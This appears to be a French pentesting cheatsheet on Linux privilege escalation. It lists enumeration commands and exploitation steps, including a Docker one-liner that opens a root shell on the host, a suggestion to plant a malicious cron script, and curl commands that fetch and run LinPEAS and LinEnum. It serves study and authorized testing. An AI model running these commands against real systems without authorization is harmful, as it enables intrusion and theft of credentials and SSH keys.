# 🔐 Linux Privilege Escalation - Cheatsheet Cyber

Ce fichier regroupe les **étapes clés** et **commandes essentielles** pour identifier et exploiter des failles d’élévation de privilèges sur Linux lors d’une phase de post-exploitation.

---

## 1️⃣ Enumération de base

```
id  
```
> Affiche l'utilisateur courant et ses groupes

```
uname -a  
```
> Informations sur le noyau et la version du système

```
hostnamectl  
```
> Informations sur la machine

```
cat /etc/os-release  
```
> Détails de la distribution Linux

```
sudo -l  
```
> Liste les commandes sudo que l'utilisateur peut exécuter sans mot de passe

```
env  
```
> Affiche les variables d’environnement (peuvent révéler des chemins ou tokens)

---

## 2️⃣ Recherche de failles liées aux permissions

```
find / -perm -4000 -type f 2>/dev/null  
```
> Recherche fichiers avec le bit SUID (exécuté avec droits du propriétaire)

```
find / -perm -2000 -type f 2>/dev/null  
```
> Recherche fichiers avec le bit SGID

```
ls -la /etc/passwd /etc/shadow  
```
> Vérifie les permissions sur les fichiers sensibles

```
ls -la /var/run/docker.sock  
```
> Vérifie accès au socket Docker (potentiel contournement de sécurité)

---

## 3️⃣ Vérification des configurations vulnérables

```
cat /etc/sudoers  
```
> Liste des règles sudo (ou utiliser sudo -l)

```
ls -la /etc/sudoers.d/  
```
> Fichiers sudoers additionnels

```
cat /etc/passwd | grep bash  
```
> Utilisateurs avec shell

```
crontab -l  
```
> Tâches cron de l’utilisateur

```
cat /etc/crontab  
```
> Tâches cron système

```
ls -la /tmp /var/tmp /dev/shm  
```
> Dossiers temporaires avec possibles permissions dangereuses

---

## 4️⃣ Exploitation de failles classiques

### Exécution de commandes en tant que root via sudo

```
sudo commande  
```
> Si sudo -l montre des commandes sans mot de passe, les exécuter

### Fichiers SUID vulnérables

```
./vuln_suid_binary  
```
> Exploiter un binaire SUID mal configuré pour obtenir un shell root

### Exploitation via crontab

Ajouter un script malveillant dans un dossier accessible par cron si possible

### Exploitation Docker (si accès socket)

```
docker run -v /:/mnt --rm -it alpine chroot /mnt sh  
```
> Obtenir un shell root via conteneur Docker

---

## 5️⃣ Outils automatisés d’élévation

### LinPEAS

```
curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh -o linpeas.sh  
chmod +x linpeas.sh  
./linpeas.sh  
```
> Audit complet et automatique des failles

### LinEnum

```
curl -L https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh -o LinEnum.sh  
chmod +x LinEnum.sh  
./LinEnum.sh  
```
> Script d’énumération pour trouver failles classiques

---

## 6️⃣ Techniques avancées

- Exploiter les variables PATH mal configurées  
- Analyser les fichiers bash_history ou zsh_history  
- Vérifier les bibliothèques LD_PRELOAD/Ld_LIBRARY_PATH  
- Rechercher les mots de passe ou clés SSH dans des fichiers accessibles  
- Vérifier les processus en cours avec privilèges élevés

---

## 📌 Ressources utiles

- https://book.hacktricks.xyz/linux-unix/privilege-escalation/linux-privilege-escalation  
- https://gtfobins.github.io/  
- https://github.com/carlospolop/PEASS-ng  
- https://github.com/rebootuser/LinEnum  
